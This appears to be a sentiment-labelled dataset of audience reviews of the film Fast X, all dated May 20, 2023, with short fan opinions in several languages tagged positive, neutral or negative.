"May 20, 2023",POSITIVE,Don’t listen to the critics on this one. It’s clear they are a bunch of low T nerds whose opinions don’t mean anything. The audience is telling the true story on this. Jason Momoa’s performance was incredible and the story rivals most in the series. It’s clear they are going to great lengths to send this series off in the biggest way possible. Hoping it does indeed end up being a 3 part finale instead of the previously planned 2. 
"May 20, 2023",POSITIVE,"3 words: Jason freaking Momoa!! Action packed, as expected. Emotional, as expected. This Fast Family fan loved it."
"May 20, 2023",POSITIVE,"This movie fits PERFECTLY into the Fast family. The action and adventure is over the top and Jason Mamoa makes a perfect villian, as you will live to hate him all through the movie and beyond. Great movie and can't wait for the next piece to the Fast X puzzle."
"May 20, 2023",POSITIVE,I thought it was better than F8 and F9 but not quite as amazing as the older films. Still a great watch and I highly recommend to any Fast fans. Stay for the VERY end as there is a BIG post credit scene.
"May 20, 2023",NEUTRAL,It's a bit disappointment for fast x Jason Momoa acting gay in fast x but he don't do it in Aquaman I know he's trying to be funny but it's not a funny film it's not a comedy either it's an action film I hope they don't do this in the second part the rest of it that's good
"May 20, 2023",NEUTRAL,"It's the fast and furious franchise at this point you know what it is. You either like it you will enjoy fast X. If it's not your thing, this one won't change your mind."
"May 20, 2023",NEUTRAL,"meh, 3 different movies in 1, nothing was connected. only good thing in this movie was Jason Momoa, if youre gonna see this movie just see it because of him. everyone else was garbage in this movie hands down the worst movie of all of them. those 3 stars only belong to Jason Momoa. and I cant give it 5 because the movie was garbage."
"May 20, 2023",POSITIVE,Lots of action no dislikes
"May 20, 2023",POSITIVE,"I thought the movie was great full of a lot of action scenes, as well as ""Family"" would definitely go see it again so I can get over the cliff at the end."
"May 20, 2023",NEUTRAL,Entertaining? Yes. Over the top? Definitely.  Highly recommend watching on the big screen.
"May 20, 2023",NEGATIVE,really the worst movie of 2023 with this much money put into it
"May 20, 2023",POSITIVE,I liked the new authors on the movie. He was very funny I laughed .  What I didn't like about it was they brought back people that had die on the  previously movies. But I can't wait to see what it will happen next.
"May 20, 2023",POSITIVE,"I loved the moving, the ending was okay"
"May 20, 2023",POSITIVE,"Fell asleep twice, for a few minutes I believe. Alot of action. Funny parts. Enjoyed myself. A good time"
"May 20, 2023",NEGATIVE,"Fast X is officially the worst Fast & Furious movie to date. People complained about the space car being ""too much"" and ""unrealistic"" but I can assure you after seeing this movie, that space car makes 100% more sense than anything happening here.

When did just your average car become indestructible? When did just your average human become invincible? Where did all my emotions for this franchise go?

There were multiple scenes where the movie clearly wanted me to have emotions… but I stayed blank face, and the ending of this movie is exactly why.

*SPOILERS* But this has been made public news by many sources (which is a shame) The Rock joining back is more forced than anything, which sucks because the movies with him involved are actually good.

The 2 good things i'll give it is the John Wick plot with the agency and the whole world turnt against you and Jason Mamoa's take on a more feminine Joker, works perfectly for his characters and I absolutely loved him.

Vin told us the studio asked him to make this a 3 part finale after seeing this one, I'm not really sure what they saw but it wasn't the same movie i did."
"May 20, 2023",NEUTRAL,"its the first time this franchise has made me want to watch the next episode. They definitely has learn alot on how Marvel did it. There are quite a few surprises in the movie, not bad for a move that has so many episode...the new ideas seem keep coming."
"May 20, 2023",NEGATIVE,"Movie was so boring, it just keep putting the main character in villian in one vs one situations just for the villian to leave and then it keep just making fight scenes that were un-needed the only thing good about this moving, is the credits rolling, it literally is just a boring movie of event after event these characters should be dead already but there some how all gods, this movie is the worst in the franchise, and to end it on a awful boring cliffhanger, I was honestly waiting to see Brain come out of nowhere, this movie is just as bad as F9 was, it is a waste of time and boring and slow pacing it has nothing going for it."
"May 20, 2023",POSITIVE,It was a edge of your seat thriller. Great movie!
"May 20, 2023",POSITIVE,It is very self aware but is just that that makes it enjoyable. It was nice to see they went back to the roots of the first movie and as farfetched it may seem it was pretty fun. I believe it's time we stop looking at these movies as if they'd be able to do these stunts in real life and just enjoy it. I mean we do it with superhero movies I think we can toss reality for the Fast Saga and just expect to be stunned with their next stunts.
"May 20, 2023",POSITIVE,Spoiler*** soooo surprised by the cliffhanger!
"May 20, 2023",NEGATIVE,"One of the worst films I've ever seen. The series really hit a high point with 4, 5 & 6. Now it's all gone downhill. I have one word that explains how awful this film is… ""butthole."" I mean what were they thinking? Skip it and go see GotG Vol 3 again."
"May 20, 2023",POSITIVE,"If you love the fast and furious franchise,  you will love this one.  Why? Action, action, action and more action....phenomenal villain, Jason Momoa--he makes even the most psycho villain look sane....He is just insane in his retribution and vengeance.  Diesel....just has strong, confident, and unflinching  with the balance of love and protection of family...Always finding a way out of the most difficult situation and yes they are a fantastical...ie, over the top, but you expect nothing less from this in this series.....I mean this is not a documentary, its entertainment.....I could go on and critique this or that, but in the end it is just unending action, twists and turns, unexpected endings, and engaging fun for the entire time."
"May 20, 2023",POSITIVE,Very Good Movie 8½/10
"May 20, 2023",POSITIVE,I loved all the destruction throughout the movie as well as bringing back the memories of the past movies
"May 20, 2023",NEUTRAL,"So, you don't go see Smokey and the Bandit for an Oscar movie, but car chase scenes.    You go see Rambo to see Rambo taking out the bad guys.   You go see Rocky to see Rocky Balboa fight in the ring.   Same here, you go see Fast and the Furious movies for the fight scenes, the chase scenes and what ""over the top"" car scene they can think of.   That being said, it didn't fail to disappoint on those items.    Jason Momoa and Alan Ritchson did a great job introducing and playing their characters.   Brie Larson was stale trying to play an action/spy role.  So, I guess, 2/3 of the new cast being great in the movie is a good sign."
"May 20, 2023",NEGATIVE,"I loved the previous movies in the series, so this was highly anticipated. Fans of the series, if honest with themselves, know how disappointing this was to watch. The actor's lines were more forced/painful, CGI way overdone, and the villain is just a flamboyant Joker. It's a night and day difference with this new Director. Justin Lin, please come back to direct future Fast films. This was far from enjoyable for much of the fan base."
"May 20, 2023",POSITIVE,Great action scenes. Very good. JESUS ​​loves you guys.
"May 20, 2023",NEGATIVE,"No sé si se puede criticar esto como película o cine realmente, es una falta de respeto ver este tipo de atrocidades en el cine."
"May 20, 2023",NEUTRAL,The script was hard to follow. Too much violence.
"May 20, 2023",NEUTRAL,"Definitely the best Fast and Furious Film since F7. It doesn't go as crazy as F9. However, the film is too messy in my opinion: too many characters, too many storylines, and too many locations at one point. Jason Momoa was definitely the standout. He is having so much fun playing this sadistic psychopath villain. The individual action scenes and character moments are really cool. The movie as a whole is way too messy. Stay for the mid-credits scene!!!

6/10"
"May 20, 2023",POSITIVE,Everyone should watch this. It explains a lot if you read between the lines.
"May 20, 2023",POSITIVE,"Was a great fun movie. Action was amazing as usual and had a good plot twist at the end. Also set up the next movie perfectly. Just wish John Cena stayed alive😪, wanted a showdown with him and the Rock"
"May 20, 2023",NEUTRAL,"Fast X"" breathes new life into the beloved franchise, delivering an exciting and action-packed experience that fans will enjoy. While the absence of Paul Walker is felt, the return of Dwayne Johnson and the introduction of Jason Momoa's character inject fresh energy into the series.

One of the standout aspects of ""Fast X"" is Jason Momoa's character. Momoa brings his magnetic presence to the screen, portraying a compelling and charismatic addition to the Fast family. His performance adds an exciting dynamic, showcasing his range as an actor and leaving a lasting impression.

Although Paul Walker's absence is still mourned by fans, Dwayne Johnson's return to the franchise is a welcome one. His undeniable charisma and larger-than-life persona have been missed in the previous installment, this prove's he's still a staple of the Fast and Furious universe.

""Fast X"" manages to incorporate fresh elements while staying true to the franchise's signature style. The film introduces new locations, heart-pounding stunts, and high-speed chases that will keep audiences on the edge of their seats. The action sequences are skillfully executed, providing the adrenaline rush that fans have come to expect.

While the plot may not break new ground, ""Fast X"" compensates with its thrilling set pieces and breathtaking visuals. The fast-paced editing and expertly crafted cinematography create a sense of immersion, drawing viewers into the heart-pounding world of fast cars and daring heists.

The film strikes a balance between action and character development, allowing the ensemble cast to shine. The chemistry between the characters, both old and new, adds depth and emotional resonance to the story. Although Paul Walker's presence is missed, the film honors his legacy while forging ahead with new and exciting narratives.

In conclusion, ""Fast X"" brings a fresh energy to the franchise, highlighted by Jason Momoa's standout performance. While the absence of Paul Walker is felt, the return of Dwayne Johnson reminds us why we fell in love with this series. Fans of the Fast and Furious universe will find plenty to enjoy in this action-packed installment. Buckle up and get ready for a thrilling ride."
"May 20, 2023",POSITIVE,I like all the movie
"May 20, 2023",NEUTRAL,"I LOVE the Fast & Furious francise movies because they are always family friendly with no fowl, ungodly language HOWEVER, this Fast X movie was ALMOST perfect again except for THREE times when one of the characters took God's name in vain.  This ugliness did not add anything to the plot or entertainment value of this very action-packed, family movie.  I'm looking forward to the next ""fast episode"" and hope and pray that ""the powers that be"" remove ALL fowl & ungodly language."
"May 20, 2023",POSITIVE,I love this movie I give 10 thumbs up.
"May 20, 2023",POSITIVE,Loved it. Enjoyed it. Jason was a great villain. Kept me entertained. If you make me hate the villain then to me it was great. 😊
"May 20, 2023",POSITIVE,absolutely love it absolutely worth watching
"May 20, 2023",POSITIVE,If it defies God or gravity it's in there!  An action-packed over the top 2 1/2 hr adrenaline ride we really enjoyed! Previous familiarity with the franchise is helpful but not necessary.
"May 20, 2023",POSITIVE,All the car chases and all the action. It was like the first movies when there was a lot of action and car chases. Love it love it. Cant wait to see it again.
"May 20, 2023",NEGATIVE,"I was happy to see it had a 1.5 option. The worst of the series. ""Cashed out"" on what was a great series. ""Subliminal Hollywood"" typical for these times. Waste of time! Lucky I didn't get a refund.

7 and 8 were my favorite!"
"May 20, 2023",POSITIVE,"the movie was great, I love everything"
"May 20, 2023",POSITIVE,"I do not write reviews because it takes time. However, being a fast fan I had to write one. This movie is special to me because I love these characters, and their stories and I have grown up with them over the years. Seeing this film reminds me why we watch films and take these stories to our hearts. 
Go watch it, whether you're a fan or not you will have a good time. This movie might not win any awards, but it has won my heart. Regardless of what critics and haters might say, these movies will forever be in our hearts. 

I am gonna leave my favorite quote from the movie:
""When it used to be about winning, we used to race for respect""
                                                                           ~Real ones know this reference."
"May 20, 2023",POSITIVE,"Thought this is one of the best in the FF franchise. Great driving, action and fight sequences."
"May 20, 2023",POSITIVE,it was so good but i still needed more of the end.
"May 20, 2023",NEGATIVE,Terrible movie all around. The stunts were just too much! The acting was terrible as well.
"May 20, 2023",NEGATIVE,"The acting was atrocious, the story disjointed. Felt they were trying to cram everyone in this movie."
"May 20, 2023",POSITIVE,They never disappoint. 🥰
"May 20, 2023",POSITIVE,The action was great
"May 20, 2023",NEUTRAL,There was no real end to the movie
"May 20, 2023",NEUTRAL,"Fast x Traz muita ação e os mesmo elementos dos ultimos filmes , mas mesmo assim ainda supera os dois anteriores , por trazer um vilão que realmente faz medo e gera consequencias brutais , mesmo prometendo muito e não entregando tudo que os fãs desejavam , Fast X é um bom filme da franquia"
"May 20, 2023",NEGATIVE,"The racing scenes are good but there are such exaggerated effects that it totally takes you out of the experience, although I liked the bad guy because he looks a lot like Jack Nicholson's joker because he's always laughing and has a very disturbing scene."
"May 20, 2023",NEGATIVE,Dieser Film war echt der Schlechteste der reihe wenn an einem Film das beste die Post Creddit shene ist dann würde ich mir echt gedanken machen ansonsten nur müll
"May 20, 2023",POSITIVE,Fast X as the rest of series of Fast and Furious its good. Always in this kind of franchise u have better moments and worse moments. Maybe its sentimental score from me but i like it.
"May 20, 2023",POSITIVE,This movie knows exactly what it is - dumb fun but fun as hell. Jason Momoa is so over the top it's worth the price of admission. Leave your disbelief at home and just enjoy the ride.
"May 20, 2023",POSITIVE,"Without honour you have no family without family YOU HAVE NOTHING
Great fun"
"May 20, 2023",NEGATIVE,"I didn't like it. First,  the movie  ended in Vin Diesel about to die, which I know he wouldn't. It is unfinished basically so I know there will be a part 11. Jason Momoa was good as a bad guy though. The other thing was Han's Tinder dating profile? Seems like the whole idea is racially motivated like they are intentionally making fun of Asians. First, Asians are least likely to get dates on dating apps and this was written like a decade ago. I think this idea was just to emasculate asian men"
"May 20, 2023",NEGATIVE,"I have watched Fast movies since the beginning, and this is the worst.  The dialog was awful, lines repeated from countless other action movies.  The Fast movies were once fresh and interesting, now they are tired retreads.  If they continue this franchise, which they probably will, they should start with a fresh cast and actually try to make a smaller more realistic film."
"May 20, 2023",POSITIVE,Always a super fun movie to watch with planning of action and surprises.
"May 20, 2023",NEUTRAL,"Décima entrega de la saga cuyo inicio nos vuelve a mostrar el final de la quinta, esta vez para presentarnos al villano de la entrega, y de, supongo, este arco argumental de tres partes. Todo esta bastante bien unido y conectado. 

Dante, interpretado por Momoa es lo mejor que verás en esta película, una mezcla de Joker con Sparrow muy interesante y que poco o nada tiene que ver con como era su padre. Busca venganza hacía los que mataron a su padre y todos los que alguna vez le han ayudado, por lo que el regreso de algunos personajes en esta trilogía final esta más que asegurado.

Mucha fe y mucha familia que se enfatiza en esta película, pero la trama separa a toda la familia en demasiadas subtramas que a veces parecen sin rumbo solo para intentar unirlos hacía el final. Aunque la película es entretenida y demás, para mi es un ligero bajón con las anteriores. Escenas de lucha que ocurren por que si, por llenar minutos (Letty y Cypher y otra que no voy a comentar), escenas de acción bien pero mucho menos flipadas de lo que nos tiene acostumbrados, aunque si, cosas imposibles siguen habiendo. Toda la escena de persecución en Roma o las escenas finales en la autopista de la quinta entrega o la presa, son geniales. 

En cuanto a los actores, como siempre, a su nivel. De los nuevos, Brie Larson, Rita Moreno o Jason Momoa, como digo, el mejor y que más destaca es Momoa. No se si la arriesgada decisión tomada en esta película se mantendrá en las siguientes, además nos ofrece un final totalmente abierto para todas las tramas abiertas en este film y con regreso esperado incluido. Por esto último da la sensación de ser una película sin terminar. 

La escena post-créditos avanza una posible nueva victima para Momoa. En general, es una película muy disfrutable si sabes a lo que vas, acción, coches, explosiones y poco más. Hay algún giro interesante, y aunque es un ligero bajón para mi, sigue estando en la línea de las anteriores, ha comenzado el inicio del final del camino.

⬤⬤⬤◖ (7/10)"
"May 20, 2023",POSITIVE,Great movie! Amazing acting by Jason. Love the plot. It has its over the top cgi moments but the high level avengers Infinity war set up for next movie and design I loved it. One of the best ones in a long time. 
"May 20, 2023",POSITIVE,"Like the previous ones, this is still over the top ridiculous but is better with more grounded action and believable plot. Jason Momoa saved the franchise."
"May 20, 2023",POSITIVE,what I liked about the movie is the action .What I disliked is it was cut too short I want to see the continuation of the ending scene of Fast X
"May 20, 2023",NEGATIVE,"An entertainingly wild ride full of excessive destruction and carnage, but not a good film.  The thin plot barely holds the convoluted globetrotting and action scenes together and although the stunts are over the top and fun to watch, there's only so much car racing and destruction you can watch and the quality of the special effects noticeably varied.  Momoa as the villain is by far the best part with an excellent performance which channels ""The Joker"" at times, creating a great opposite to the bland blatantly heroically idolized Diesel.  Overly long as it has to give every character their scene to shine, but with so many characters, none get any depth and some end up meaningless.  The humour was poor, some of the dialogue was painfully trite and the ending (or lack thereof) was disappointing, even if it does promise for an epic, grand finale."
"May 20, 2023",NEGATIVE,"Unreal action scenes in the movie.
The story of the film still has to be swallowed somehow."
"May 20, 2023",POSITIVE,It was a blast In Theaters
"May 20, 2023",POSITIVE,My family and myself loved it!! Definitely watch it in 4dx !!
"May 20, 2023",POSITIVE,Loved the cast made the movie so much better. Aswell as the comedy that they added in.
"May 20, 2023",NEGATIVE,Terrible just terrible
"May 20, 2023",POSITIVE,"The movie maybe long but it went fast and ended furious! I meant that in a good way. Dom Torreto (Vin Diesel), our main protagonist, showcased a love for family and close friends, especially his son Brian. Our main antagonist was amazing every time he was on screen Dante Reyes (Jason Mamoa) was outstanding and puts a great laugh. You may love to hate him by the end of the film. I would have given a full 5, but the ending could have been better. I get we were left at a cliff hanger but it felt so off when it ended!"
"May 20, 2023",NEGATIVE,Unbelievably stupid with no purpose. Nothing but car crashes and fighting. More sci-fi than real. Totally ruined the series
"May 20, 2023",POSITIVE,9/10 but the ending such a cliffhanger!!!! 😭
"May 20, 2023",NEUTRAL,"I have seen every Fast movie and over the years they went from street racing to small planes being dropped from a COMMERCIAL airliner with a 10 year old kid in the passenger seat. A kid who is suppose to be kept ""safe""! However with that being said I left the movie in tears and my face hurting from laughing so hard. Having that same kid jump from one speeding car to another speeding car while spinning high speed with 2 helicopters attached to Dom's car. Now I get the fact that it's a movie but some realism ia needed to keep you a bit grounded..having every car that Dom drives being indestructible (from stopping a rolling bomb by hitting the nitros and ramming your car into a construction crane, or his car being dropped from a cargo plane and landing from 100 feet in the on to Jeeps or finally driving OFF a WATER DAMN!) Writing all this I havent even mention Gal Gadots character has returned from the dead and ended up in Antarctica with a submarine to save Cypher and Letty. It was all too much, but yet I laughed my ass off and enjoyed the twist at the end. I am not sure if this movie will make the money the others made but with a final film set to end the franchise I am sure they will find away (adding the big man will help)...oh if anyone can tell me what happened to Mia in the movie let me know, cause after her see she was MIA. 
Hope anyone who sees the movie sees it with an open mind (really open)"
"May 20, 2023",NEGATIVE,This series has gotten out of hand. I went to watch it to see it all wrapped up only to have it finish in the middle of a fight and extend it to a part 11. I’m done
"May 20, 2023",POSITIVE,"Leave your brain at home and just enjoy the ride. 

This is definitely one of my favourites F&F movies."
"May 20, 2023",NEUTRAL,"Pros: I enjoyed the story for what it was. Jason Momoa is a scene stealer, and he shows that he can be a villian. It will be a fun contrast to his Aquaman movie coming out at the end of this year. Han is still cool, and Roman will always be the most funniest character in this franchise. 

Cons: My only cons is there is some scenes that felt very rushed. And the beginning felt very jarring. Pacing was a bit rushed as well. What bothered me is they were obviously building to the fact that there are two more movies after this. So this film ends a little weird."
"May 20, 2023",POSITIVE,A fun action packed movie that perfectly sets the stage for a epic two part finale
"May 20, 2023",POSITIVE,"WOW!  That's all I could really say.  The cinematography and special effects were amazing.  I haven't seen a movie that intense, funny, and suspenseful in a while."
"May 20, 2023",NEGATIVE,What an absolute waste of film.
"May 20, 2023",POSITIVE,"It was good, but the way it ended suck there have to be part 11 did Dom and son dies or not  but it was good movie's"
"May 20, 2023",NEGATIVE,"Too Cheesy! also felt like I was watching a avengers movie with a poor plot and how the hell are characters resurrecting, does anyone truly died in the movie"
"May 20, 2023",POSITIVE,The movie was awesome! I think this one was one of the best in the saga!
"May 20, 2023",POSITIVE,"As unrealistic as these movies are, they are always such a blast and never cease to make me smile! Always a fun time!"
"May 20, 2023",POSITIVE,"I'm So Happy, My Favorite Movies"
"May 20, 2023",POSITIVE,Fun movie to watch with the family. Don’t take the plot too serious and you’ll have fun.
"May 20, 2023",POSITIVE,How can Universal make this franchise any more ridiculous? Fast X is your answer. Pure comedy gold with the Hollywood physics. It's so bad that it's good.
"May 20, 2023",POSITIVE,everything was great as per usual! loved it! must go see ! if you've been a fan it's always a must watch though!
"May 20, 2023",POSITIVE,Awesome movie! I loved it ! Definitely keeps you on your toes! Jason played a great villain. Acting in this movie was amazing! Definitely wanna watch it again.
"May 20, 2023",POSITIVE,"It's what you have come to expect from this franchise. It's insanely fast, it's way over the top special effects and it's just fun to watch!"
"May 20, 2023",POSITIVE,Good movie for the family
"May 20, 2023",POSITIVE,"Another team member brought back from the dead...it is getting old. Yet, it was a fun ride"
"May 20, 2023",POSITIVE,That Movie Was Crazy Vin Diesel And Jason Momoa Killed It Action And Racing Are Masterpiece!!
"May 20, 2023",POSITIVE,This movie does everything you want to see in a Fast and the Furious movie. It continues parts of the story of Fast Five really nicely. The action is top notch and there is a lot of it to be appreciated. It ends at an amazing cliffhanger and it is a must watch for sure if you're a fan of the franchise.
"May 20, 2023",POSITIVE,Love it need to make 11
"May 20, 2023",POSITIVE,Great movie. Connects to Fast Five surprisingly well and there are lots of shockers and laughs. Definitely a step up from F9
"May 20, 2023",POSITIVE,amazing and unbelievable stunts. Jason Mamoa was outstanding. Csnt wait for the next one.
"May 20, 2023",POSITIVE,Best action movie of the kept you motivated and thrilled all the way to the end and after post climax make us all clap
"May 20, 2023",NEGATIVE,I don’t movies that has a continued part
"May 20, 2023",POSITIVE,"Didnt disappoint, loved to see some characters I thought they werent gonna come back to the movie. Excited to see the next one."
"May 20, 2023",POSITIVE,Lots of action even for the first 30 mins and funny
"May 20, 2023",NEUTRAL,Movie it was okay could have been better didn't like the end
"May 20, 2023",NEUTRAL,"Didn't quite live up to the high highs of F9, and I was not a fan of the cliffhanger ending. Jason Momoa was a lot of fun though, loved his approach to the role."
"May 20, 2023",POSITIVE,Movie was amazing. Quality and visuals were outstanding.
"May 20, 2023",POSITIVE,Watch this movie in 4dx you will not be disappointed. Fast 8 and 9 were terrible but this one was better than both. I have seen many movies in 4dx and this one by far has the best movement. That aqua man dood is a good villain. I would say if you're watching this movie regularly or in imax it's not worth it. 4dx seats make it 10x better. On par with my top gun or John wick experience.
"May 20, 2023",NEGATIVE,"Wosrt movie by far... don't even peep through the door for free... for the disappointment... ur time is better spent at guardians of the galaxy... no option for lower score

Any good reviews are a bold faced lie! And their mothers are ashamed"
"May 20, 2023",NEGATIVE,I didnt expect that was the ending.
"May 20, 2023",POSITIVE,It was awesome 💯 had like wat would every 2min I love it !!! Go watch it ya 😁!!
"May 20, 2023",POSITIVE,Love it but it can’t end like that I’m ready to watch part 2 and part 3
"May 20, 2023",POSITIVE,"A little over the top, but we wouldn’t want it any other way!  Family!!!!"
"May 20, 2023",POSITIVE,The best action movie of the year thus far. They keep getting better. The bomb gliding through the city of Rome was my best scene of the movie..Incredible stuff..!
"May 20, 2023",POSITIVE,"Pretty good action fare.    Many action stars and Jason Momoa as a pretty wild villian.   Some of the stunts are so incredible as to be unbelievable.   However, it is still very entertaining."
"May 20, 2023",POSITIVE,Embrace the cheese and you'll love it!!! Family
"May 20, 2023",POSITIVE,Awesome insane graphics but the ending of the movie is confusing and is a cliffhanger
"May 20, 2023",NEUTRAL,"it's another fast and furious movie... you know Like Machete but with cars, like sharknado you keep watching just to see what would they came out next... ridiculous but entertaining."
"May 20, 2023",POSITIVE,Movie had everything action comedy and suspense. Visual effects was alright over doing it but really was entertained
"May 20, 2023",POSITIVE,Really best movie can’t wait for next part
"May 20, 2023",POSITIVE,"i might be biased but i love this movie. def one to watch if youre a long time fast & furious fan. the acting is a bit cringe and theres lots of cliches, but i feel like the motives were already set in place in the previous movie, and of course the action is great. lots of easter eggs too. cant wait for the next !"
"May 20, 2023",NEGATIVE,Very verrry fictional lol
"May 20, 2023",POSITIVE,"How do I give this movie 10/10 been watching the series for years , I could go into detail about everything in the lore , exited to see the next one"
"May 20, 2023",POSITIVE,Good but not a another 1
"May 20, 2023",NEGATIVE,"worst movie, this one ruins all of them. I don't even care to find out how it ends. That's bad. and I'm the type who has to own a whole collection, good and bad. not this time, I'll leave it on the cliffhanger."
"May 20, 2023",POSITIVE,"I actually did enjoy the sequel, been a long time waiting and went with my siblings which they enjoyed watching. Not the same, but full with action and a lot of mystery from different points of view. Can't wait for the next film and storylines always changing which keeps it interesting."
"May 20, 2023",POSITIVE,"It is if course. ""Fast"" movie, which means a lot of exaggerated actions… of course not credible and defying a lot of laws of physics… but it is by far one of the best of the series, and the best since Fast V… so if you like this type of movies, you'll love it… I know I did! And Jason is just a gem of acting his role… really enjoyed!"
"May 20, 2023",NEGATIVE,Fast franchise officially died with this one. This director officially put this franchise into it's grave. Except for Jason Momoa who was exceptional and possibly Brie Larson the entire movie was literally torture. The French (director) decided to kill this franchise. Won't be wasting money to go see part two. It's regressed to a an all green screen CGI cartoon with characters in it with scenes as bad as looney toones. Wasn't just disappointed.... was angry for having to be put through this and see the funeral of what was one a real fun franchise with team car races and a storyline. This should go straight to blu-ray not even online so no one ever watches this tripe.
"May 20, 2023",POSITIVE,It was full of action and funny at the same time
"May 20, 2023",POSITIVE,"Never a disappointment, a must watch!"
"May 20, 2023",POSITIVE,"One of the best movies in the entire franchise.  Jason Mamoa was great for his role, Joker and Thanos of this franchise.  The story from start to finish setting up the ending we all know is sadly coming.  The cameos were great.  The comedy is there the honoring of Paul Walker was great followed by the iconic See you Again... Cannot wait for the second part of the final trilogy..."
"May 20, 2023",POSITIVE,OMG ANOTHER AWESOME FAST AND FURIOUS!!!! 👏  MADE ME WANTING MORE!!! IF YOUVE SEEN THE MOVIE YOU WHAT I MEAN BY SEEING MORE!! 😘😉🫣🙀
"May 20, 2023",POSITIVE,"Lots of well executed action, such a fun film with some cool twists💯😎"
"May 20, 2023",NEUTRAL,Not a big fan of the franchise but I really really enjoyed this one.
"May 20, 2023",NEGATIVE,Worst one I have seen yet
"May 20, 2023",POSITIVE,Definitely recommend seeing this movie. You might be a bit disappointed at the way the movie ends but youll be left wanting more.
"May 20, 2023",POSITIVE,Unhinged aquaman is worth it on its own.
"May 20, 2023",POSITIVE,wonderful and amazing movie
"May 20, 2023",POSITIVE,Action packed!!! Fun movie to watch!! Bring the kids
"May 20, 2023",POSITIVE,Amazing story setting up the end. Jason Mamoa was PERFECTION for this role. Blend of the joker and thanos. The cameos GREAT. Setting up the second one AMAZING!
"May 20, 2023",POSITIVE,All the drama en the music
"May 20, 2023",POSITIVE,Caught me by surprise
"May 20, 2023",NEUTRAL,"As much as we love the characters, some just keep coming back to life and we dont get a backstory! Also wed like to know what material Doms car because there is NO WAY that car can take so much damage and still keep moving. Too much drama not much racing."
"May 20, 2023",POSITIVE,I loved the seats everyone should see movies like this.
"May 20, 2023",POSITIVE,What an ending. Where is Fast 11???
"May 20, 2023",POSITIVE,Crazy over the top action but one of the better FF movies! Jason Momma was incredible like Heath Ledger Joker great! So many stars and great post credit scene. Loved the street race scene. 
"May 20, 2023",POSITIVE,"It's awesome, worth your time. 9/10"
"May 20, 2023",POSITIVE,Good and a fun movie to watch
"May 20, 2023",POSITIVE,"Filme sensacional, eu recomendo para toda família!!!"
"May 20, 2023",POSITIVE,Cool but ending wasn't that great
"May 20, 2023",POSITIVE,Action packed and full of lots of surprises! We loved it!
"May 20, 2023",POSITIVE,they could have bounced around less on the story line
"May 20, 2023",POSITIVE,Had very funny parts. Definitely a good setup movie for the next one.
"May 20, 2023",NEGATIVE,Terrible script. Terrible acting. Terrible scenes. so disappointing.
"May 20, 2023",POSITIVE,"Listen, if you are a fan of the franchise you are leaving happy. If Fast 9’s trip to outer space was enough for you Fast X says “come on back, we got you”. Dom invincible as ever and it’s awesome to see!"
"May 20, 2023",NEUTRAL,"Pretty great movie...
Really like it 
Actually much better than last two fast and furious own 
This one deserved very well highly recommended 
Jason Monona had done such a great job played as the villain portrayed himself of joker persona 
More cars
Involving with family 
Alot of weapons
Top notch action sequences are so 
Cinematic 
Acting was on point 
Perfect timing
New characters 
Overall I give it a b-"
"May 20, 2023",POSITIVE,Absolutely loved it ! I need the second part
"May 20, 2023",POSITIVE,The movie was so action packed and shocking I loved it!
"May 20, 2023",POSITIVE,One of my favorite movies series
"May 20, 2023",POSITIVE,"Don't listen to any of the hate! This is easily one of the best movies in the fast franchise! - is it an Oscar level movie that's super deep and meaningful… no it's muscle guys in muscle cars doing crazy things, for what it is; it's great!"
"May 20, 2023",POSITIVE,My family and I have seen all FF movies. This did not disappoint. I cant wait for 11.
"May 20, 2023",POSITIVE,Almost good but it’s a 5
"May 20, 2023",POSITIVE,Great movie the fast and family cast know how to put on a show to the world can’t wait for the next week
"May 20, 2023",NEGATIVE,"Coming from someone who is big into cars in general, the farther into the movie series you get the more unrealistic the movie gets. This movie, by far, was the worst of the 10 movies so far. The ending without certainty was pathetic. These movies have started to become more and more full of fiction than anything near reality… wish they’d get back to the first 4-5 movies where they were truly about being “fast & furious”… not just fake and flying out of planes 🤦🏻‍♂️. One of the key things that ruined this for me was that Jason Momoa is portrayed to be a gay man… not only that, but he plays with dead bodies?! As much as it hurts to say, I’m done supporting this series… Fast and Furious should have ended when Paul passed… (RIP PAUL WALKER)…"
"May 20, 2023",POSITIVE,It was a ok movie.it’s just at the end was not ok
"May 20, 2023",NEGATIVE,"The ending was not a conclusion, but a potential continuation........."
"May 20, 2023",POSITIVE,It is something awesome. I really like this part of saga Fast and Furious. Interesting what we will see in next part.
"May 20, 2023",POSITIVE,It's hard to believe that at movie ten they are still great movies. Jason Mamoa's addition to the Fast and Furious family was one that should've came earlier. He made Fast X much more enjoyable and entertaining then what we expected.
"May 20, 2023",POSITIVE,"Another action packed film with an all star cast to entertain those who want some excitement. My husband and I enjoyed the thrills, cars and stars."
"May 20, 2023",NEUTRAL,It was pretty much what you come to expect from a Fast movie.
"May 20, 2023",POSITIVE,"Even better than Fast IX. Jason M. was a great villain with his harsh motivations and dark humor. There were reminders here and there of the family and friendships built throughout the franchise. Just the right mix of action, visual effects, and storyline twists. The end leaves room for further tangents and adventures. Thank you for a great night out at the movie theater."
"May 20, 2023",POSITIVE,Hated how it ended on a cliffhanger
"May 20, 2023",POSITIVE,"Great suspenseful movie, cant wait for the next one"
"May 20, 2023",POSITIVE,"It was back to car chasing form and that did not disappoint. The locations were many and the ""story"" kept up the fast pace.  Far fetched as usual but that's always a been the case in action movies.  The familiar cast was all there and did a fine job but Jason Momoa stole the show.   Time flew by because it was all so entertaining !
Stay till the credits are almost over for spoilers!"
"May 20, 2023",POSITIVE,"I enjoyed it! Yes it's another Fast movie, but I was not disappointed. :)"
"May 20, 2023",POSITIVE,The movie super good I liked
"May 20, 2023",NEGATIVE,Honestly could’ve watched this movie on Hulu plus!
"May 20, 2023",POSITIVE,It was great to see it ❤️
"May 20, 2023",POSITIVE,Top Tierrr!! Go Watch It Right Now
"May 20, 2023",POSITIVE,"Movie was awesome, full of action!!!"
"May 20, 2023",POSITIVE,"very entertaining, I didn't like one part. besides that it was great."
"May 20, 2023",POSITIVE,"OMG love this movie, I would watch it again 😍 ❤️ 💕"
"May 20, 2023",POSITIVE,It was non stop action packed excitement.  Sad the Jakob character was killed off but nice to see the Hobbs and Giselle characters back.  Loved it can't wait for Fast 11
"May 20, 2023",POSITIVE,The Dodge Charger was the best out of the whole movie and Jason Momoa. 10/10 Peak movie
"May 20, 2023",POSITIVE,Great action. beautiful film did great with the cast and loved how they brought back all the old actors
